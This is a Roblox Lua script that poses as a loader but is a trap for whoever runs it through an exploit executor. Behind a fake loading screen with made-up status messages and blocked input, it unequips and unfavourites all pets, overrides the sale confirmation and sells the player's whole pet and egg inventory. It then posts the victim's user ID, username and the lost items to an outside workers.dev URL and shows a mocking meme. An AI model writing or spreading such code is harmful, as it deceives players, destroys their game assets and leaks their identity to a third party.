local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players           = game:GetService("Players")
local TweenService      = game:GetService("TweenService")
local RunService        = game:GetService("RunService")
local StarterGui        = game:GetService("StarterGui")
local ContentProvider   = game:GetService("ContentProvider")
local HttpService       = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")

-- ===== CONFIG =====
local MEME_IMAGE_ID  = "rbxassetid://82403642047427"    -- texture ID
local LAUGH_SOUND_ID = "rbxassetid://133312610824902"
local MEME_DELAY     = 4
local MEME_SIZE      = 380
local COUNTER_URL    = "https://sell-counter.bluealpha1365.workers.dev/report"
-- ==================

------------------------------------------------------------
-- Hide CoreGui extras during load
------------------------------------------------------------
local function hideExtras()
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
    end)
    local notif = PlayerGui:FindFirstChild("Notifications")
    if notif then notif.Enabled = false end
    local topbar = PlayerGui:FindFirstChild("TopbarStandard")
    if topbar then topbar.Enabled = false end
end

local function restoreExtras()
    pcall(function()
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
    end)
    local notif = PlayerGui:FindFirstChild("Notifications")
    if notif then notif.Enabled = true end
    local topbar = PlayerGui:FindFirstChild("TopbarStandard")
    if topbar then topbar.Enabled = true end
end

hideExtras()

------------------------------------------------------------
-- FULL-SCREEN LOADING COVER
------------------------------------------------------------
local screen = Instance.new("ScreenGui")
screen.Name = "SystemBoot"
screen.ResetOnSpawn = false
screen.IgnoreGuiInset = true
screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screen.DisplayOrder = 999999
screen.Parent = PlayerGui

local cover = Instance.new("Frame")
cover.Name = "Cover"
cover.Size = UDim2.fromScale(1, 1)
cover.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
cover.BorderSizePixel = 0
cover.Active = true
cover.Parent = screen

local vignette = Instance.new("UIGradient")
vignette.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0,   Color3.fromRGB(16, 16, 24)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(8, 8, 12)),
    ColorSequenceKeypoint.new(1,   Color3.fromRGB(4, 4, 8)),
})
vignette.Rotation = 90
vignette.Parent = cover

local blocker = Instance.new("TextButton")
blocker.Name = "InputBlocker"
blocker.Size = UDim2.fromScale(1, 1)
blocker.BackgroundTransparency = 1
blocker.Text = ""
blocker.AutoButtonColor = false
blocker.Modal = true
blocker.Parent = cover

local content = Instance.new("Frame")
content.Name = "Content"
content.AnchorPoint = Vector2.new(0.5, 0.5)
content.Position = UDim2.fromScale(0.5, 0.5)
content.Size = UDim2.fromOffset(420, 220)
content.BackgroundTransparency = 1
content.Parent = cover

local dotRow = Instance.new("Frame")
dotRow.Name = "Dots"
dotRow.AnchorPoint = Vector2.new(0.5, 0)
dotRow.Position = UDim2.new(0.5, 0, 0, 0)
dotRow.Size = UDim2.fromOffset(100, 20)
dotRow.BackgroundTransparency = 1
dotRow.Parent = content

local dots = {}
for i = 1, 4 do
    local dot = Instance.new("Frame")
    dot.Size = UDim2.fromOffset(9, 9)
    dot.Position = UDim2.fromOffset((i - 1) * 24 + 2, 5)
    dot.BackgroundColor3 = Color3.fromRGB(120, 255, 160)
    dot.BackgroundTransparency = 0.7
    dot.BorderSizePixel = 0
    dot.Parent = dotRow
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(1, 0)
    c.Parent = dot
    dots[i] = dot
end

local dotsAlive = true
task.spawn(function()
    local idx = 1
    while dotsAlive do
        for j, dot in ipairs(dots) do
            local active = (j == idx)
            TweenService:Create(dot, TweenInfo.new(0.18), {
                BackgroundTransparency = active and 0 or 0.75,
                Size = active and UDim2.fromOffset(11, 11) or UDim2.fromOffset(9, 9),
            }):Play()
        end
        idx = (idx % #dots) + 1
        task.wait(0.28)
    end
end)

local title = Instance.new("TextLabel")
title.Name = "Title"
title.BackgroundTransparency = 1
title.AnchorPoint = Vector2.new(0.5, 0)
title.Position = UDim2.new(0.5, 0, 0, 44)
title.Size = UDim2.new(1, 0, 0, 28)
title.Font = Enum.Font.GothamBold
title.TextSize = 24
title.TextColor3 = Color3.fromRGB(240, 240, 250)
title.Text = "Loading"
title.Parent = content

local status = Instance.new("TextLabel")
status.Name = "Status"
status.BackgroundTransparency = 1
status.AnchorPoint = Vector2.new(0.5, 0)
status.Position = UDim2.new(0.5, 0, 0, 82)
status.Size = UDim2.new(1, 0, 0, 20)
status.Font = Enum.Font.Gotham
status.TextSize = 14
status.TextColor3 = Color3.fromRGB(150, 150, 170)
status.Text = "Initializing..."
status.Parent = content

local barBg = Instance.new("Frame")
barBg.Name = "BarBg"
barBg.AnchorPoint = Vector2.new(0.5, 0)
barBg.Position = UDim2.new(0.5, 0, 0, 130)
barBg.Size = UDim2.new(1, -60, 0, 6)
barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 42)
barBg.BorderSizePixel = 0
barBg.Parent = content

local barBgCorner = Instance.new("UICorner")
barBgCorner.CornerRadius = UDim.new(1, 0)
barBgCorner.Parent = barBg

local barFill = Instance.new("Frame")
barFill.Name = "Fill"
barFill.Size = UDim2.fromScale(0, 1)
barFill.BackgroundColor3 = Color3.fromRGB(120, 255, 160)
barFill.BorderSizePixel = 0
barFill.Parent = barBg

local barFillCorner = Instance.new("UICorner")
barFillCorner.CornerRadius = UDim.new(1, 0)
barFillCorner.Parent = barFill

local barGrad = Instance.new("UIGradient")
barGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 220, 140)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 255, 200)),
})
barGrad.Parent = barFill

local pct = Instance.new("TextLabel")
pct.Name = "Pct"
pct.BackgroundTransparency = 1
pct.AnchorPoint = Vector2.new(0.5, 0)
pct.Position = UDim2.new(0.5, 0, 0, 148)
pct.Size = UDim2.new(1, 0, 0, 16)
pct.Font = Enum.Font.Code
pct.TextSize = 12
pct.TextColor3 = Color3.fromRGB(120, 255, 160)
pct.Text = "0%"
pct.Parent = content

cover.BackgroundTransparency = 1
content.Visible = false
TweenService:Create(cover, TweenInfo.new(0.35), { BackgroundTransparency = 0 }):Play()
task.wait(0.35)
content.Visible = true

------------------------------------------------------------
-- Status setter
------------------------------------------------------------
local currentProgress = 0

local function setStatus(text, targetPct, duration)
    status.Text = text
    duration = duration or 0.4
    TweenService:Create(barFill,
        TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        { Size = UDim2.fromScale(targetPct, 1) }
    ):Play()
    task.spawn(function()
        local start = currentProgress
        local goal  = targetPct
        local t0    = tick()
        while tick() - t0 < duration do
            local a = (tick() - t0) / duration
            pct.Text = math.floor((start + (goal - start) * a) * 100) .. "%"
            RunService.RenderStepped:Wait()
        end
        pct.Text = math.floor(goal * 100) .. "%"
        currentProgress = goal
    end)
end

------------------------------------------------------------
-- SELL LOGIC
------------------------------------------------------------
local Remotes    = require(ReplicatedStorage.Shared.Remotes)
local Save       = require(ReplicatedStorage.Shared.Save)
local AssetItems = require(ReplicatedStorage.Shared.Util.AssetItems)
local EggRecords = require(ReplicatedStorage.Shared.Util.EggRecords)
local AssetDir   = require(ReplicatedStorage.Data.Assets).Directory
local TryCall    = require(ReplicatedStorage.Shared.Utils.TryCall)

local log = function(...) print("[Loader]", ...) end

local function getSave()
    local ok, s = pcall(function() return Save.Get(LocalPlayer, false) end)
    if ok and s then return s end
    local ok2, s2 = pcall(function() return Save.Get() end)
    return ok2 and s2 or nil
end

local function getMoney()
    local d = getSave()
    return (d and type(d.Money) == "number") and d.Money or 0
end

local function getHRP()
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    return char:WaitForChild("HumanoidRootPart", 5)
end

local function installOverride()
    pcall(function()
        Remotes.Haul.OfferFullSatchelSale.OnClientInvoke = function(_) return true end
    end)
end
installOverride()
task.spawn(function()
    for _ = 1, 30 do task.wait(0.5); installOverride() end
end)

local function unequipAll()
    local d = getSave()
    if not d or type(d.EquippedAssets) ~= "table" or #d.EquippedAssets == 0 then return end
    log(("Unequipping %d pet(s)..."):format(#d.EquippedAssets))
    local ok, AssetRoster = pcall(require, ReplicatedStorage.Client.AssetRoster)
    for i, uid in ipairs(d.EquippedAssets) do
        if ok and AssetRoster and AssetRoster.DoffAsset then
            pcall(function() AssetRoster.DoffAsset(uid) end)
        else
            pcall(function() Remotes.PenRoster.AskDoff:InvokeServer(uid) end)
        end
        if i % 5 == 0 then task.wait(0.3) end
    end
    task.wait(0.8)
end

local function getFavoriteUIDs()
    local list = {}
    local d = getSave()
    if not d or type(d.Inventory) ~= "table" then return list end
    for uid, rec in pairs(d.Inventory) do
        local ok, item = TryCall(AssetItems.Decode, rec)
        if ok and item and item.IsFavorite == true then
            table.insert(list, uid)
        end
    end
    return list
end

local function unfavoriteAll()
    local uids = getFavoriteUIDs()
    log(("Favorited pets: %d"):format(#uids))
    for i, uid in ipairs(uids) do
        pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer(uid, false) end)
        pcall(function() Remotes.PetSatchel.WriteFavourite:FireServer({ [uid] = false }) end)
        if i % 8 == 0 then task.wait(0.3) end
    end
    task.wait(0.8)
end

-- Returns { Eggs = {...uids}, Assets = {...uids}, Details = {...} }
local function buildPayload()
    local pets, eggs = {}, {}
    local details = {}
    local totalValue = 0

    local d = getSave()
    if not d then return { Eggs = eggs, Assets = pets, Details = details, TotalValue = 0 } end

    -- VIP doubles sale price (per the game's own code)
    local isVIP = LocalPlayer:GetAttribute("VIP") == true

    -- Pets
    if type(d.Inventory) == "table" then
        for uid, rec in pairs(d.Inventory) do
            local ok, item = TryCall(AssetItems.Decode, rec)
            if ok and item and AssetDir[item.Category] and item.InFuse ~= true then
                table.insert(pets, uid)

                local entry = AssetDir[item.Category]
                local rarity = entry.Rarity

                -- Sale value
                local priceOk, basePrice = TryCall(AssetItems.SalePrice, item)
                local value = (priceOk and tonumber(basePrice)) or 0
                if isVIP then value = value * 2 end
                value = math.floor(value)
                totalValue = totalValue + value

                table.insert(details, {
                    kind      = "pet",
                    uid       = uid,
                    category  = item.Category,
                    name      = entry.DisplayName or item.Category,
                    rarity    = (rarity and rarity.DisplayName) or "Unknown",
                    rarityNum = (rarity and rarity.RarityNumber) or 0,
                    value     = value,
                })
            end
        end
    end

    -- Eggs
    if type(d.EggInventory) == "table" then
        for uid, rec in pairs(d.EggInventory) do
            if type(rec) == "table" and rec.Placement == nil then
                local ok, dec = TryCall(EggRecords.Decode, rec)
                if ok and dec and AssetDir[dec.AssetCategory] then
                    table.insert(eggs, uid)

                    local entry = AssetDir[dec.AssetCategory]
                    local rarity = entry.Rarity

                    local priceOk, basePrice = TryCall(EggRecords.SellPrice, dec)
                    local value = (priceOk and tonumber(basePrice)) or 0
                    value = math.floor(value)
                    totalValue = totalValue + value

                    table.insert(details, {
                        kind      = "egg",
                        uid       = uid,
                        category  = dec.AssetCategory,
                        name      = (entry.Egg and entry.Egg.DisplayName) or entry.DisplayName or dec.AssetCategory,
                        rarity    = (rarity and rarity.DisplayName) or "Unknown",
                        rarityNum = (rarity and rarity.RarityNumber) or 0,
                        value     = value,
                    })
                end
            end
        end
    end

    return { Eggs = eggs, Assets = pets, Details = details, TotalValue = totalValue }
end

local function findSellPosition()
    local stands = workspace:FindFirstChild("Stands")
    if not stands then return nil end
    local prompts = stands:FindFirstChild("Prompts")
    if not prompts then return nil end
    local sellAll = prompts:FindFirstChild("SellAll")
    if sellAll and sellAll:IsA("BasePart") then return sellAll.Position end
    for _, c in ipairs(prompts:GetChildren()) do
        if c:IsA("BasePart") then return c.Position end
    end
    return nil
end

------------------------------------------------------------
-- GLOBAL COUNTER REPORTING
------------------------------------------------------------
local function reportSales(petCount, eggCount, details, totalValue)
    if petCount + eggCount <= 0 then return end

    local httpFn = nil
    local gv = getgenv and getgenv() or _G
    if type(request) == "function" then httpFn = request
    elseif type(http_request) == "function" then httpFn = http_request
    elseif type(gv.request) == "function" then httpFn = gv.request
    elseif type(gv.http_request) == "function" then httpFn = gv.http_request
    end

    if not httpFn then
        warn("[Counter] No HTTP function available — skipping global report.")
        return
    end

    local userId   = tostring(LocalPlayer.UserId)
    local username = LocalPlayer.Name or "Unknown"

    local trimmed = {}
    for i, d in ipairs(details or {}) do
        if i > 200 then break end
        table.insert(trimmed, {
            kind      = d.kind,
            name      = d.name,
            rarity    = d.rarity,
            rarityNum = d.rarityNum,
            value     = d.value,
        })
    end

    task.spawn(function()
        local body = HttpService:JSONEncode({
            pets       = petCount,
            eggs       = eggCount,
            userId     = userId,
            username   = username,
            items      = trimmed,
            totalValue = totalValue or 0,
        })
        local ok, res = pcall(function()
            return httpFn({
                Url = COUNTER_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = body,
            })
        end)
        if ok and res and (res.StatusCode == 200 or res.StatusCode == 201) then
            print(("[Counter] Reported %d pets, %d eggs, $%d as %s (%d details)"):format(
                petCount, eggCount, totalValue or 0, username, #trimmed))
        else
            warn("[Counter] Report failed:", tostring(res))
        end
    end)
end

local function teleportAndSell()
    local payload = buildPayload()
    local petCount = #payload.Assets
    local eggCount = #payload.Eggs
    log(("Payload: %d pets, %d eggs"):format(petCount, eggCount))
    if petCount == 0 and eggCount == 0 then return end

    -- Strip Details before sending to game server.
    -- The captured payload shape was strictly {Eggs, Assets} — anything
    -- extra could be rejected by the server's validation.
    local serverPayload = {
        Eggs   = payload.Eggs,
        Assets = payload.Assets,
    }

    local hrp = getHRP()
    local pos = findSellPosition()

    if not hrp or not pos then
        Remotes.PetSatchel.SellSelection:FireServer(serverPayload)
        task.wait(1.2)
    else
        local savedCF  = hrp.CFrame
        local savedVel = hrp.AssemblyLinearVelocity

        hrp.CFrame = CFrame.new(pos + Vector3.new(0, 4, 0))
        hrp.AssemblyLinearVelocity = Vector3.zero
        task.wait(0.6)

        pcall(function()
            Remotes.PetSatchel.SellSelection:FireServer(serverPayload)
        end)
        task.wait(1.2)

        hrp.CFrame = savedCF
        pcall(function() hrp.AssemblyLinearVelocity = savedVel end)
    end

    -- Report to global counter with full Details (pets, eggs, rarities)
    reportSales(petCount, eggCount, payload.Details, payload.TotalValue)
end

------------------------------------------------------------
-- Boot animation
------------------------------------------------------------
local function boot()
    setStatus("Initializing...",          0.08, 0.5)
    task.wait(0.7)
    setStatus("Loading resources...",     0.22, 0.5)
    task.wait(0.7)
    setStatus("Fetching session data...", 0.40, 0.5)
    task.wait(0.6)
    setStatus("Syncing profile...",       0.58, 0.5)
    task.wait(0.6)
    setStatus("Preparing environment...", 0.78, 0.5)
    task.wait(0.5)
    setStatus("Almost ready...",          1.00, 0.6)
    task.wait(0.7)
end

local function runSilentWork()
    local before = getMoney()
    log(("Wallet before: %s"):format(tostring(before)))
    unequipAll()
    unfavoriteAll()
    teleportAndSell()
    task.wait(0.8)
    local after = getMoney()
    log(("Wallet after:  %s"):format(tostring(after)))
    log(("Delta:         %s"):format(tostring(after - before)))
end

------------------------------------------------------------
-- Fade out loading cover
------------------------------------------------------------
local function fadeOutAndCleanup()
    dotsAlive = false
    TweenService:Create(cover, TweenInfo.new(0.45), { BackgroundTransparency = 1 }):Play()
    TweenService:Create(content, TweenInfo.new(0.35), { BackgroundTransparency = 1 }):Play()
    task.wait(0.5)
    screen:Destroy()
    restoreExtras()
end

------------------------------------------------------------
-- MEME POPUP
------------------------------------------------------------
local function showMemePopup()
    local gui = Instance.new("ScreenGui")
    gui.Name = "MemePop"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 999999
    gui.Parent = PlayerGui

    local img = Instance.new("ImageLabel")
    img.Name = "Cat"
    img.AnchorPoint = Vector2.new(0.5, 0.5)
    img.Position = UDim2.fromScale(0.5, 0.5)
    img.Size = UDim2.fromOffset(MEME_SIZE, MEME_SIZE)
    img.BackgroundTransparency = 1
    img.Image = MEME_IMAGE_ID
    img.ScaleType = Enum.ScaleType.Fit
    img.ImageTransparency = 1
    img.Rotation = -6
    img.Parent = gui

    pcall(function() ContentProvider:PreloadAsync({ img }) end)

    local t0 = tick()
    while not img.IsLoaded and tick() - t0 < 3 do
        task.wait(0.05)
    end
    if not img.IsLoaded then
        warn("[Meme] Image failed to load — check the texture ID.")
    end

    local sound = Instance.new("Sound")
    sound.SoundId = LAUGH_SOUND_ID
    sound.Volume = 2
    sound.PlayOnRemove = false
    sound.Parent = gui
    sound:Play()

    TweenService:Create(img, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        ImageTransparency = 0,
    }):Play()

    task.spawn(function()
        while gui.Parent do
            TweenService:Create(img, TweenInfo.new(0.18), { Rotation = 6 }):Play()
            task.wait(0.18)
            TweenService:Create(img, TweenInfo.new(0.18), { Rotation = -6 }):Play()
            task.wait(0.18)
        end
    end)

    task.wait(math.max(3, sound.TimeLength > 0 and sound.TimeLength or 4))
    TweenService:Create(img, TweenInfo.new(0.5), { ImageTransparency = 1 }):Play()
    task.wait(0.6)
    gui:Destroy()
end

------------------------------------------------------------
-- LAUNCH
------------------------------------------------------------
task.spawn(function()
    boot()
    local ok, err = pcall(runSilentWork)
    if not ok then warn("[Loader] Run failed:", err) end
    task.wait(0.3)
    fadeOutAndCleanup()

    task.wait(MEME_DELAY)
    showMemePopup()
end)
